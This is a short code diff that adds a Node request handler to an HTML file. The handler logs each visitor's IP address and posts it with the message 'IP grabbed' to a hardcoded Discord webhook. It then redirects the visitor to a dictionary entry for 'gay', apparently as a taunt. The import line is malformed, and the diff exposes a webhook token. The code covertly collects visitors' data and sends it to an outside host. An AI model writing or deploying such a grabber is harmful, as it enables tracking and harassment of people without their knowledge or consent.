@@ -31,3 +31,20 @@
   </p>
 </body>
 </html>
+
+ fetch from 'node-fetch';
+
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1403441631251792102/ftoLxUSLsSm4-F3ZYfPsnPUfl6YoYt0f4MyisTC7zFQf8tTJERDLVyjB1iUyXl2WAeOQ';
+
+export default async function handler(req, res) {
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  await fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: `IP grabbed: ${ip}` }),
+  });
+
+  res.writeHead(302, { Location: 'https://www.dictionary.com/browse/gay' });
+  res.end();
+}
